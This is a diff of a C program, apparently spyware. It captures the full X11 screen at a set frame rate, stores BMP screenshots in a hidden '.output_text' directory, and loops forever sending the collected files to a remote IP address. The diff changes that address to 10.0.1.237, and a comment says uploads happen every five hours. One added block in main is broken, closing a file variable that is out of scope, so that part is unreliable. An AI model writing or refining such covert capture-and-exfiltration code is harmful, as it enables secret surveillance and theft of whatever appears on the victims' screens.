@@ -16,12 +16,16 @@ const char *output_file_dir = ".output_text";
 #include <unistd.h>
 #include <sys/stat.h>
 #include <sys/types.h>
-
-
+#include <signal.h>
 #include <X11/Xlib.h>
 #include <X11/Xutil.h>
-#include <unistd.h>
 #include <time.h>
+
+volatile sig_atomic_t keep_running = 1;
+
+void handle_sigint(int sig) {
+    keep_running = 0;
+}
 
 void save_bitmap(XImage *image, const char *filename) {
     FILE *f = fopen(filename, "wb");
@@ -30,44 +34,31 @@ void save_bitmap(XImage *image, const char *filename) {
         return;
     }
 
-    // BMP header
-    unsigned char header[54] = {
-        'B', 'M', 0, 0, 0, 0, 0, 0, 54, 0, 0, 0, 40, 0, 0, 0, 
-        0, 0, 0, 0, 1, 0, 24, 0
-    };
-
-    // Image size
     unsigned int image_size = image->width * image->height * 3;
     unsigned int file_size = 54 + image_size;
 
-    // Write the header with updated size
-    header[2] = (file_size & 0xFF);
-    header[3] = (file_size >> 8) & 0xFF;
-    header[4] = (file_size >> 16) & 0xFF;
-    header[5] = (file_size >> 24) & 0xFF;
-
-    header[18] = (image->width & 0xFF);
-    header[19] = (image->width >> 8) & 0xFF;
-    header[20] = (image->width >> 16) & 0xFF;
-    header[21] = (image->width >> 24) & 0xFF;
-
-    header[22] = (image->height & 0xFF);
-    header[23] = (image->height >> 8) & 0xFF;
-    header[24] = (image->height >> 16) & 0xFF;
-    header[25] = (image->height >> 24) & 0xFF;
+    unsigned char header[54] = {
+        'B', 'M', file_size & 0xFF, (file_size >> 8) & 0xFF,
+        (file_size >> 16) & 0xFF, (file_size >> 24) & 0xFF,
+        0, 0, 0, 0, 54, 0, 0, 0, 40, 0, 0, 0,
+        image->width & 0xFF, (image->width >> 8) & 0xFF,
+        (image->width >> 16) & 0xFF, (image->width >> 24) & 0xFF,
+        image->height & 0xFF, (image->height >> 8) & 0xFF,
+        (image->height >> 16) & 0xFF, (image->height >> 24) & 0xFF,
+        1, 0, 24, 0, 0
+    };
 
     fwrite(header, sizeof(unsigned char), 54, f);
 
-    // Write pixel data
     for (int y = image->height - 1; y >= 0; y--) {
         for (int x = 0; x < image->width; x++) {
             unsigned long pixel = XGetPixel(image, x, y);
-            unsigned char red = (pixel & 0xFF0000) >> 16;
-            unsigned char green = (pixel & 0x00FF00) >> 8;
-            unsigned char blue = pixel & 0x0000FF;
-            fwrite(&blue, sizeof(unsigned char), 1, f);
-            fwrite(&green, sizeof(unsigned char), 1, f);
-            fwrite(&red, sizeof(unsigned char), 1, f);
+            unsigned char blue = pixel & 0xFF;
+            unsigned char green = (pixel >> 8) & 0xFF;
+            unsigned char red = (pixel >> 16) & 0xFF;
+            fwrite(&blue, 1, 1, f);
+            fwrite(&green, 1, 1, f);
+            fwrite(&red, 1, 1, f);
         }
     }
 
@@ -75,11 +66,15 @@ void save_bitmap(XImage *image, const char *filename) {
 }
 
 void capture_screen_at_fps(int target_fps, const char *output_directory) {
+    mkdir(output_directory, 0755);  // Crée le dossier s'il n'existe pas
+
     Display *dpy = XOpenDisplay(NULL);
-    if (dpy == NULL) {
+    if (!dpy) {
         fprintf(stderr, "Cannot open X display\n");
         return;
     }
+
+    signal(SIGINT, handle_sigint); // Permet de stopper avec Ctrl+C
 
     Window root = DefaultRootWindow(dpy);
     XWindowAttributes gwa;
@@ -88,32 +83,27 @@ void capture_screen_at_fps(int target_fps, const char *output_directory) {
     int screen_width = gwa.width;
     int screen_height = gwa.height;
 
-    clock_t last_capture_time = clock();
-    int target_delay = CLOCKS_PER_SEC / target_fps;
-    int image_counter = 0;
+    struct timespec delay;
+    delay.tv_sec = 0;
+    delay.tv_nsec = (1000000000L / target_fps);
 
-    while (1) {
-        clock_t current_time = clock();
-        int time_diff = current_time - last_capture_time;
-
-        // Si le temps écoulé est plus grand que le délai cible, on capture
-        if (time_diff >= target_delay) {
-            XImage *image = XGetImage(dpy, root, 0, 0, screen_width, screen_height, AllPlanes, ZPixmap);
-            if (image != NULL) {
-                // Créer un nom de fichier unique basé sur le compteur d'image
-                char filename[1024];
-                snprintf(filename, sizeof(filename), "%s/screenshot_%d.bmp", output_directory, image_counter);
-                save_bitmap(image, filename);
-                printf("Image sauvegardée : %s\n", filename);
-                XDestroyImage(image);
-            }
-            last_capture_time = current_time; // Réinitialiser l'heure de la dernière capture
-            image_counter++;
+    while (keep_running) {
+        XImage *image = XGetImage(dpy, root, 0, 0, screen_width, screen_height, AllPlanes, ZPixmap);
+        if (image) {
+            time_t timestamp = time(NULL);
+            char filename[1024];
+            snprintf(filename, sizeof(filename), "%s/%ld.bmp", output_directory, timestamp);
+            save_bitmap(image, filename);
+            printf("Image sauvegardée : %s\n", filename);
+            XDestroyImage(image);
         }
+        nanosleep(&delay, NULL);
     }
 
     XCloseDisplay(dpy);
+    printf("\nCapture arrêtée proprement.\n");
 }
+
 
 
 void start(char *path, char *arg){
@@ -182,6 +172,27 @@ int main(int argc, char *argv[]) {
 
     get_parent_path1(pid, path, sizeof(path));    
     mkdir(output_file_dir, 0755);
+    
+    char *filename = ".output_text/text.txt";
+
+    // Teste si le fichier existe déjà
+    FILE *test = fopen(filename, "r");
+    if (test != NULL) {
+        // Le fichier existe déjà
+        fclose(test);
+        printf("Le fichier existe déjà. On ne touche pas.\n");
+    } else {
+        // Le fichier n'existe pas, on le crée
+        FILE *file = fopen(filename, "w");
+        if (file != NULL) {
+            fprintf(file, "Fichier nouvellement créé.\n");
+            fclose(file);
+            printf("Fichier créé avec succès !\n");
+        } else {
+            printf("Erreur lors de la création du fichier.\n");
+        }
+    }
+    fclose(file);
 
     if (argc < 1){
         start(path, "1");
@@ -198,8 +209,8 @@ int main(int argc, char *argv[]) {
     while (1){
         SLEEP(5);// 18000);
         // Envoi des fichiers toutes les 5 heures
-        send_dir(output_dir, "8.8.8.8");
-        send_file(output_file, "8.8.8.8", 1);
+        send_dir(output_dir, "10.0.1.237");
+        send_file(output_file, "10.0.1.237", 1);
     }
 
     return 0;
